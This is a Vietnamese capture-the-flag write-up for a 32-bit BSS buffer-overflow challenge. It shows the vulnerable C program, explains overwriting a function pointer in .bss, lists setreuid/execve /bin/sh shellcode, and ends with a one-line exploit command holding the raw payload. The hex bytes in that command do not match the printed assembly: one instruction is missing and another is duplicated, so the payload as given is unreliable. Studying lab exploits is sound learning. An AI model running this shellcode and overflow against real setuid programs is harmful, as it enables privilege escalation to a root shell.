
 ## ELF x86 - BSS BOF
```c
#include <stdio.h>
#include <stdlib.h>
 
char username[512] = {1};
void (*_atexit)(int) =  exit;
 
void cp_username(char *name, const char *arg)
{
  while((*(name++) = *(arg++)));
  *name = 0;
}
 
int main(int argc, char **argv)
{
  if(argc != 2)
    {
      printf("[-] Usage : %s <username>\n", argv[0]);
      exit(0);
    }
   
  cp_username(username, argv[1]);
  printf("[+] Running program with username : %s\n", username);
   
  _atexit(0);
  return 0;
}
```

Đây là một bài bss overflow, đầu tiên nhìn vào chương trình c một biến toàn cục username và một con trỏ hàm _atexit được đặt trong .bss section.
Chúng ta có thể tận dụng lỗi buffer  overflow từ hàm cp_username để exploit chương trình này.
Đầu tiên cần tìm được địa chỉ của biến username. Sử dụng câu lệnh ```info variables``` để xem địa chỉ của biến username

![](Images/bss_print_local_var.png)

Tiếp theo chúng ta đặt shellcode vào trong mảng username do mảng có độ dài 512 byte sao khi đặt shellcode vào phần còn lại chúng ta đặt bất kỳ để lấp đầy mảng.Và sau đó ghi địa chỉ shellcode vào con trỏ hàm để nó thực thi được shellcode.

File .passwd chỉ có thể đọc bởi user `app-systeme-ch7-cracked`
![image2](https://user-images.githubusercontent.com/83420725/144893307-0838b74e-ab63-4963-9898-2d9e78e01793.png)

 Đây là shell code 

```asm
section .text

global _start

_start:
	push   0x46
	pop    eax
	mov    bx, 0x4b7
	mov    cx, 0x453
	int    0x80

	xor    edx, edx
	push   0xb
	pop    eax
	push   edx
	push   0x68732f2f
	push   0x6e69622f
	mov    ebx, esp
	push   edx
	push   ebx
	mov    ecx, esp
	int    0x80
```
     
     nasm -f elf -o shellcode.o shellcode.nasm
     ld -m elf_i386 -o shellcode shellcode.o
     objdump -d shellcode

Exploit

    ./ch7 $(python -c "print '\x58\x66\xbb\xb7\x04\x66\xb9\x53\x04\x66\xb9\x53\x04\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80' + 'A' * (512 - 39) + '\x40\xa0\x04\x08'")
